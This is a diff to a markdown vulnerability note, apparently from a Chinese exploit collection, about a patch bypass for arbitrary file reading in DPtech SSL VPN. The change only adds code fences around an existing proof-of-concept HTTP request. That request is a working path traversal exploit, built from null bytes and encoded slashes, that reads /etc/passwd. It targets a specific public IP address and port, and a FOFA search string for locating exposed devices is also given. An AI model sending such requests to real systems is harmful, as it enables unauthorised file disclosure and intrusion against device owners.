@@ -77,6 +77,7 @@ FOFA：app="DPtech-SSLVPN"
 
 POC/EXP：
 
+```http
 GET /.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2Fetc%2Fpasswd HTTP/1.1
 Host: 58.215.24.114:6443
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
@@ -84,6 +85,8 @@ Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept: application/json, text/javascript, */*; q=0.01
 Accept-Encoding: gzip, deflate
 Connection: keep-alive
+```
+
 
 ![image-20241010142008824](./.resource/迪普SSLVPN任意文件读取漏洞补丁绕过/media/image-20241010142008824.png)
 
